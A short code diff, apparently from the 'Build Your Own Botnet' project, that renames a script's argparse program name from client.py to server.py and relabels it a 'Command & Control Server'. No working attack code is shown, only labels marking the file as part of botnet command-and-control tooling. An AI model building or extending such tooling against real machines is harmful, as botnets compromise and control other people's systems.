@@ -62,8 +62,8 @@ __banner__ = """
 def main():
 
     parser = argparse.ArgumentParser(
-        prog='client.py',
-        description="Generator (Build Your Own Botnet)"
+        prog='server.py',
+        description="Command & Control Server (Build Your Own Botnet)"
     )
 
     parser.add_argument(
